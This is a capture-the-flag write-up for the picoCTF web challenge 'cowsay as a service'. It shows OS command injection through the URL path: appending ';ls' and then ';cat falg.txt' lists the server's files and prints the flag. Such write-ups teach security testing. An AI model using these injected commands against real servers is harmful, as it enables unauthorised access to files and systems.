## Details
- Category: Web Exploitation
- Points: 150

## Description
```
Now presenting cowsay as a service
```
The link - [cowsay as a service](https://caas.mars.picoctf.net/)
## Hint
```
(None)
```
## Solution
When we click the link sent to us we are sent to a page with this text:
```
Make a request to the following URL to cowsay your message:
https://caas.mars.picoctf.net/cowsay/{message}
```
When we make the request with a certain message, like "hello" - https://caas.mars.picoctf.net/cowsay/{hello}, we get this:
```
 _________
< {hello} >
 ---------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```
For context: cowsay is more or less a joke within hacker culture, it is essentially a service within linux (caas - Cow as a Service).

That means we are in a linux machine, let's try to bypass this service and look through the files in the system:

Let's try the ls command to list all files in the directory - https://caas.mars.picoctf.net/cowsay/{hello};ls

and sure enough we get a list of all the files in this directory:
```
Dockerfile
falg.txt
index.js
node_modules
package.json
public
yarn.lock
```

Now let's print out the contents of the falg.txt - https://caas.mars.picoctf.net/cowsay/{hello};cat falg.txt

and we get the **flag: picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}**

